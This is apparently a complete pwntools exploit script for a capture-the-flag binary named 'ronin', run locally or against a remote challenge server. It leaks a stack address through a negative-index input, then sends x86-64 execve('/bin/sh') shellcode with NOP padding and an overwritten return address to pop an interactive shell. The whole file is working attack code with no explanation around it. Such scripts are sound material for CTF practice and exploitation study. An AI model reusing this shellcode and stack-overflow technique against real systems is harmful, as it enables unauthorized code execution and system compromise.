from pwn import *
import sys

binary = context.binary = ELF("./ronin_patched")

if not args.REMOTE:
    p = process(binary.path)
else:
    p = remote("pwn.chall.pwnoh.io", 13372)

payload =  b""
payload += b"Chase after it."
payload += b"\x48\x81\xec\x00\x01\x00\x00\x48\x31\xc0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

with open("payload", "wb") as fp:
    fp.write(payload + b"\n")

p.sendline(payload)

payload =  b""
payload += b"-4"

with open("payload", "ab") as fp:
    fp.write(payload + b"\n")

p.sendline(payload)
p.readuntil("look?")

payload = b"2\n"

with open("payload", "ab") as fp:
    fp.write(payload)

p.sendline(payload)

address = p.readuntil("You")[:-3]
print(address)
if args.GDB:
    address = b"\x10\xdf\xff\xff\xff\x7f"

address = int.from_bytes(address, "little") - 65

payload = b""
payload += b"\x48\x81\xec\x00\x01\x00\x00\x48\x31\xc0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
assert len(payload) < 0x28
payload += b"\x90" * (0x28 - len(payload))
payload += p64(address)

with open("payload", "ab") as fp:
    fp.write(payload)

p.sendline(payload)
p.interactive()